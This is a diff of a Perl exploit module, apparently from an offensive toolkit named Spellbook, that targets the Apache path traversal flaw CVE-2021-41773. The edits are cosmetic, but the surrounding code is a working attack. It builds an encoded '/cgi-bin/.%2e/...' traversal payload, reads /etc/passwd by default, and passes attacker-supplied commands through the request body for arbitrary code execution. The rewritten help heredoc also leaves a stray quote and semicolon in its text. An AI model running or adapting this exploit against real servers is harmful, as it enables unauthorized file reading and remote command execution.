@@ -16,10 +16,10 @@ package Spellbook::Advisory::CVE_2021_41773 {
         );
 
         if ($target) {
-            if ($target !~ /^http(s)?:\/\//x) { 
+            if ($target !~ /^http(?:s)?:\/\//x) {
                 $target = "https://$target";
             }
-            
+
             if (!$file) { $file = "/etc/passwd"; }
 
             my $payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/";
@@ -34,7 +34,7 @@ package Spellbook::Advisory::CVE_2021_41773 {
 
             my $useragent = Spellbook::Core::UserAgent -> new();
             my $request   = $useragent -> get(
-               "https://" . $target . $payload, 
+               "https://" . $target . $payload,
                 Content => $command || " "
             );
 
@@ -44,13 +44,16 @@ package Spellbook::Advisory::CVE_2021_41773 {
         }
 
         if ($help) {
-            return "
-                \rExploit::CVE_2021_41773
-                \r=======================
-                \r-h, --help     See this menu
-                \r-t, --target   Define a target
-                \r-f, --file     Define a file to read
-                \r-c, --command  Arbitrary code execution\n\n";
+            return<<"EOT";
+
+Exploit::CVE_2021_41773
+=======================
+-h, --help     See this menu
+-t, --target   Define a target
+-f, --file     Define a file to read
+-c, --command  Arbitrary code execution\n\n";
+
+EOT
         }
 
         return 0;
